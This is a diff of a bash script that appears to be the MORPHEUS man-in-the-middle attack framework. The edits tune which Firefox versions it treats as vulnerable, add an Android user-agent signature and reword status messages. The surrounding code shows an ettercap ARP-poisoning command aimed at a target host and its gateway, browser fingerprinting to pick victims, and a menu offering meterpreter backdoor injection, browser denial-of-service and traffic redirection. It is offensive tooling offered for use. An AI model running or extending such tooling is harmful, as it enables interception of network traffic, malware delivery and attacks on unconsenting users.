@@ -851,7 +851,7 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
 
   # check if target system its vuln
   # User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0
-  nOn="48" # above versions are patched (official release its 51.0.1)...
+  nOn="49" # above versions are patched (official release its 51.0.1)...
   HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print $2,$3'}` > /dev/null 2>&1
   AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print $2,$3'}` > /dev/null 2>&1
   DisP=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "User-Agent:" | awk {'print $2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12'}` > /dev/null 2>&1
@@ -867,7 +867,7 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
 if [ $VeVul \> $nOn ]; then
 echo "${GreenF}    Browser report:${RedF} not vulnerable...${BlueF}"
 sleep 3
-echo ${YellowF}[☠] module cant verify browser version '(running blind)'${RedF}!${Reset};
+echo "${RedF}[x]${white} module cant verify browser version ${RedF}(${YellowF}running blind${RedF})!"
 sleep 1
 else
 echo "${GreenF}    Browser report: vulnerable...${BlueF}"
@@ -988,8 +988,9 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
         xterm -T "MORPHEUS - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
       fi
 
-  # check if target system its vuln
-  # Mozilla/5.0 (Linux; U; Android 4.0.3; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
+# check if target system its vuln
+# Mozilla/5.0 (Linux; Android 6.0.1; VFD 600 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
+# Mozilla/5.0 (Linux; U; Android 4.0.3; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
   nOn="Android"
   HoSt=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Host:" | awk {'print $2,$3'}` > /dev/null 2>&1
   AcLa=`cat $IPATH/logs/UserAgent.log | egrep -m 1 "Accept-Language" | awk {'print $2,$3,$3'}` > /dev/null 2>&1
@@ -1010,7 +1011,7 @@ sleep 3
 else
 echo "${GreenF}    Browser report:${RedF} not vulnerable...${BlueF}"
 sleep 3
-echo ${YellowF}[☠] module cant verify browser version '(running blind)'${RedF}!${Reset};
+echo "${RedF}[x]${white} module cant verify browser version ${RedF}(${YellowF}running blind${RedF})!"
 sleep 1
 fi
 
@@ -1363,7 +1364,7 @@ cat << !
     |   4    -  Redirect browser traffic         [ to another domain  ] |
     |   5    -  Redirect browser traffic         [ to google sphere   ] |
     |   6    -  Inject backdoor into </body>     [ meterpreter.exe    ] |
-    |   7    -  Firefox denial-of-service        [ firefox =< 49.0.0  ] |
+    |   7    -  Firefox denial-of-service        [ firefox =< 49.0.1  ] |
     |   8    -  Android denial-of-service        [ android browsers   ] |
     |   9    -  Replace website images           [ img src=http://www ] |
     |  10    -  Replace website text             [ replace: worlds    ] |
